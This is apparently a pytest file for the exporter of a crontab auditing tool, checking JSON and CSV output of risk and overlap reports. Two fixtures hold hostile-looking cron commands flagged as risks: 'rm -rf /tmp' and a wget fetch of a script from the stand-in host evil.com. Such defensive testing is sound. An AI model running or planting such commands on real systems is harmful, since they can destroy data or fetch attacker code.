"""Tests for crontab_audit.exporter module."""

import json
import pytest
from unittest.mock import MagicMock
from crontab_audit.exporter import export_json, export_csv
from crontab_audit.reporter import AuditReport
from crontab_audit.parser import CrontabEntry


def make_entry(command="/usr/bin/backup", host="host1"):
    entry = CrontabEntry(
        minute="0",
        hour="2",
        day_of_month="*",
        month="*",
        day_of_week="*",
        command=command,
    )
    entry.host = host
    return entry


def make_empty_report():
    report = MagicMock(spec=AuditReport)
    report.risks = []
    report.overlaps = []
    report.validation_errors = []
    report.summary = {
        "total_entries": 0,
        "total_risks": 0,
        "total_overlaps": 0,
        "total_validation_errors": 0,
    }
    return report


def test_export_json_empty_report():
    report = make_empty_report()
    result = export_json(report)
    data = json.loads(result)
    assert data["summary"]["total_entries"] == 0
    assert data["risks"] == []
    assert data["overlaps"] == []
    assert data["validation_errors"] == []


def test_export_json_with_risk():
    entry = make_entry(command="rm -rf /tmp")
    flag = MagicMock()
    flag.entry = entry
    flag.reason = "Dangerous command: rm -rf"

    report = make_empty_report()
    report.risks = [flag]
    report.summary["total_risks"] = 1

    result = export_json(report)
    data = json.loads(result)
    assert len(data["risks"]) == 1
    assert data["risks"][0]["reason"] == "Dangerous command: rm -rf"
    assert data["risks"][0]["host"] == "host1"


def test_export_json_is_valid_json():
    report = make_empty_report()
    result = export_json(report)
    parsed = json.loads(result)
    assert isinstance(parsed, dict)


def test_export_csv_headers():
    report = make_empty_report()
    result = export_csv(report)
    assert result.startswith("type,host,command,detail")


def test_export_csv_with_risk():
    entry = make_entry(command="wget http://evil.com/script.sh")
    flag = MagicMock()
    flag.entry = entry
    flag.reason = "Network fetch command"

    report = make_empty_report()
    report.risks = [flag]

    result = export_csv(report)
    assert "risk" in result
    assert "wget" in result
    assert "Network fetch command" in result


def test_export_csv_with_overlap():
    entry_a = make_entry(command="/bin/job_a")
    entry_b = make_entry(command="/bin/job_b")
    overlap = MagicMock()
    overlap.entry_a = entry_a
    overlap.entry_b = entry_b
    overlap.overlap_times = ["02:00", "02:05"]

    report = make_empty_report()
    report.overlaps = [overlap]

    result = export_csv(report)
    assert "overlap" in result
    assert "job_a" in result
    assert "2 overlapping" in result


def test_export_csv_empty_report_only_header():
    report = make_empty_report()
    result = export_csv(report)
    lines = [l for l in result.strip().splitlines() if l]
    assert len(lines) == 1
